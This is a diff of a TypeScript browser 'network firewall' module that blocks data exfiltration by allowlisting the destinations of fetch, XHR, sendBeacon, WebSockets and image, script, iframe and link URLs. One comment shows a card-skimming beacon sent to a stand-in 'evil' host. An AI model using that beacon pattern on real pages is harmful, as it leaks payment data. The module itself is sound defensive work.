@@ -1,95 +1,161 @@
 /**
- * Zero-Trust Network Firewall
- * Intercepts `window.fetch` and `XMLHttpRequest` to strictly allowlist domains,
- * blocking unauthorized data exfiltration attempts (e.g. from XSS payloads).
+ * Zero-Trust Network Firewall v2
+ *
+ * Allowlists where the page may send data. Covers the common exfiltration
+ * channels used by skimmers and XSS payloads:
+ *   fetch, XMLHttpRequest, navigator.sendBeacon, WebSocket, EventSource,
+ *   and resource "beacons" via <img>/<script>/<iframe> src and <link> href
+ *   (property setters and setAttribute).
+ *
+ * Same-origin requests, data: and blob: URLs are always allowed.
+ * In 'report' mode nothing is blocked, only reported.
  */
+import { createReporter, ThreatListener } from '../core/events'
+import { isAllowedUrl } from '../core/callsite'
+import { patchMethod, patchSetter, PatchGroup } from '../core/hooks'
 
+export interface NetworkFirewallOptions {
+  /** Hosts, origins or wildcards ('*.stripe.com') that may receive requests */
+  allow: string[]
+  /** 'enforce' blocks (default), 'report' only reports */
+  mode?: 'enforce' | 'report'
+  /** Watch <img>/<script>/<iframe>/<link> URLs too (default true) */
+  resources?: boolean
+  onBlocked?: (url: string, channel: string) => void
+  onThreat?: ThreatListener
+}
+
+const reporter = createReporter('networkFirewall', 'critical')
+let group: PatchGroup | null = null
 let activeDisable: (() => void) | null = null
+let stats = { allowed: 0, blocked: 0, blockedUrls: [] as string[] }
+
+const ALWAYS_OK = /^(data|blob|about|javascript):/i
+
+function toUrlString(input: any): string {
+  if (typeof input === 'string') return input
+  if (typeof Request !== 'undefined' && input instanceof Request) return input.url
+  return String(input)
+}
 
 export const networkFirewall = {
-  /** True while the firewall is wrapping fetch/XHR */
   isEnabled() {
     return activeDisable !== null
   },
 
-  /** Restore the original fetch and XMLHttpRequest. Safe to call when not enabled. */
+  /** Counts since enable() */
+  getStats() {
+    return { ...stats, blockedUrls: stats.blockedUrls.slice() }
+  },
+
   disable() {
-    if (activeDisable) activeDisable()
+    activeDisable?.()
   },
 
   /**
-   * Initialize the firewall with a list of allowed domains.
-   * @param allowedDomains Array of domain strings (e.g., ['api.my-app.com', 'google-analytics.com'])
-   * @param onBlocked Callback when a request is blocked
+   * Turn the firewall on. Accepts options, or the v1 form `enable(['api.x.com'], onBlocked)`.
+   * Calling it again replaces the previous configuration.
+   * Returns a function that turns it off.
    */
-  enable(allowedDomains: string[], onBlocked?: (url: string) => void) {
-    if (typeof window === 'undefined') return () => {};
+  enable(optsOrAllow: NetworkFirewallOptions | string[], onBlockedV1?: (url: string) => void): () => void {
+    if (typeof window === 'undefined') return () => {}
+    const opts: NetworkFirewallOptions = Array.isArray(optsOrAllow)
+      ? { allow: optsOrAllow, onBlocked: onBlockedV1 ? (u) => onBlockedV1(u) : undefined }
+      : optsOrAllow
 
-    // Calling enable() again replaces the old allowlist instead of wrapping twice
-    if (activeDisable) activeDisable();
+    if (activeDisable) activeDisable()
+    reporter.setCallback(opts.onThreat)
+    stats = { allowed: 0, blocked: 0, blockedUrls: [] }
 
-    // Ensure current origin is always allowed
-    const currentOrigin = window.location.origin;
-    const whitelist = new Set([...allowedDomains, currentOrigin]);
+    const enforce = opts.mode !== 'report'
+    const allow = opts.allow ?? []
 
-    const isAllowed = (urlStr: string) => {
-      try {
-        // Handle relative URLs
-        const url = new URL(urlStr, currentOrigin);
-        
-        // Exact match or subdomain match
-        return Array.from(whitelist).some(allowed => 
-          url.origin === allowed || url.hostname === allowed || url.hostname.endsWith(`.${allowed}`)
-        );
-      } catch (e) {
-        return false; // Block malformed URLs
+    /** true = let it through */
+    const check = (raw: unknown, channel: string): boolean => {
+      const url = toUrlString(raw)
+      if (!url || ALWAYS_OK.test(url.trim()) || isAllowedUrl(url, allow)) {
+        stats.allowed++
+        return true
       }
-    };
+      stats.blocked++
+      if (stats.blockedUrls.length < 100) stats.blockedUrls.push(url)
+      reporter.report(enforce ? 'request_blocked' : 'request_reported', { url, channel, enforced: enforce })
+      opts.onBlocked?.(url, channel)
+      return !enforce
+    }
 
-    // 1. Intercept Fetch
-    const originalFetch = window.fetch;
-    window.fetch = async function (input: RequestInfo | URL, init?: RequestInit) {
-      const urlString = typeof input === 'string' ? input : (input instanceof Request ? input.url : input.toString());
-      
-      if (!isAllowed(urlString)) {
-        document.dispatchEvent(new CustomEvent('hyde:threat', { 
-          detail: { source: 'networkFirewall', type: 'fetch_blocked', url: urlString } 
-        }));
-        if (onBlocked) onBlocked(urlString);
-        return Promise.reject(new Error(`[HydeSecurity] Fetch blocked by network firewall: ${urlString}`));
+    const blockedError = (url: string, channel: string) =>
+      new TypeError(`[HydeSecurity] ${channel} blocked by network firewall: ${url}`)
+
+    group = new PatchGroup()
+
+    // fetch
+    group.add(patchMethod(window, 'fetch', original => function (this: any, input: any, init?: any) {
+      const url = toUrlString(input)
+      if (!check(url, 'fetch')) return Promise.reject(blockedError(url, 'fetch'))
+      return original.call(this, input, init)
+    }))
+
+    // XMLHttpRequest
+    if (typeof XMLHttpRequest !== 'undefined') {
+      group.add(patchMethod(XMLHttpRequest.prototype, 'open', original => function (this: any, ...args: any[]) {
+        const url = toUrlString(args[1])
+        if (!check(url, 'xhr')) throw blockedError(url, 'xhr')
+        return original.apply(this, args)
+      }))
+    }
+
+    // sendBeacon — a favourite of skimmers (fires even on page unload)
+    if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon === 'function') {
+      group.add(patchMethod(navigator, 'sendBeacon', original => function (this: any, url: any, data?: any) {
+        if (!check(url, 'sendBeacon')) return false
+        return original.call(this, url, data)
+      }))
+    }
+
+    // WebSocket / EventSource constructors
+    for (const name of ['WebSocket', 'EventSource'] as const) {
+      const Original = (window as any)[name]
+      if (typeof Original !== 'function') continue
+      const Guarded: any = new Proxy(Original, {
+        construct(target, args, newTarget): object {
+          const url = toUrlString(args[0])
+          if (!check(url, name)) throw blockedError(url, name)
+          return Reflect.construct(target, args, newTarget === Guarded ? target : newTarget)
+        }
+      })
+      ;(window as any)[name] = Guarded
+      group.add(() => {
+        if ((window as any)[name] === Guarded) (window as any)[name] = Original
+      })
+    }
+
+    // Resource beacons: new Image().src = 'https://evil/?cc=...'
+    if (opts.resources !== false && typeof HTMLElement !== 'undefined') {
+      const targets: Array<[any, string]> = [
+        [typeof HTMLImageElement !== 'undefined' && HTMLImageElement.prototype, 'src'],
+        [typeof HTMLScriptElement !== 'undefined' && HTMLScriptElement.prototype, 'src'],
+        [typeof HTMLIFrameElement !== 'undefined' && HTMLIFrameElement.prototype, 'src'],
+        [typeof HTMLLinkElement !== 'undefined' && HTMLLinkElement.prototype, 'href']
+      ]
+      for (const [proto, prop] of targets) {
+        if (!proto) continue
+        group.add(patchSetter(proto, prop, (el, value) => check(value, `${el.tagName.toLowerCase()}.${prop}`)))
       }
-      return originalFetch.apply(this, [input, init]);
-    };
+      const watched: Record<string, string> = { IMG: 'src', SCRIPT: 'src', IFRAME: 'src', LINK: 'href' }
+      group.add(patchMethod(Element.prototype, 'setAttribute', original => function (this: Element, name: string, value: string) {
+        if (watched[this.tagName] === String(name).toLowerCase() && !check(value, `${this.tagName.toLowerCase()}.${name}`)) return
+        return original.call(this, name, value)
+      }))
+    }
 
-    // 2. Intercept XMLHttpRequest
-    const originalXhrOpen = window.XMLHttpRequest.prototype.open;
-    window.XMLHttpRequest.prototype.open = function(
-      method: string, 
-      url: string | URL,
-      async: boolean = true, 
-      username?: string | null, 
-      password?: string | null
-    ) {
-      const urlString = url.toString();
-      
-      if (!isAllowed(urlString)) {
-        document.dispatchEvent(new CustomEvent('hyde:threat', { 
-          detail: { source: 'networkFirewall', type: 'xhr_blocked', url: urlString } 
-        }));
-        if (onBlocked) onBlocked(urlString);
-        throw new Error(`[HydeSecurity] XHR blocked by network firewall: ${urlString}`);
-      }
-      return originalXhrOpen.call(this, method, url, async, username, password);
-    };
-
-    // Return a disable function to restore original APIs
     const disable = () => {
-      if (activeDisable !== disable) return; // already replaced or disabled
-      window.fetch = originalFetch;
-      window.XMLHttpRequest.prototype.open = originalXhrOpen;
-      activeDisable = null;
-    };
-    activeDisable = disable;
-    return disable;
+      if (activeDisable !== disable) return // a newer enable() replaced this one
+      group?.restoreAll()
+      group = null
+      activeDisable = null
+    }
+    activeDisable = disable
+    return disable
   }
-};
+}
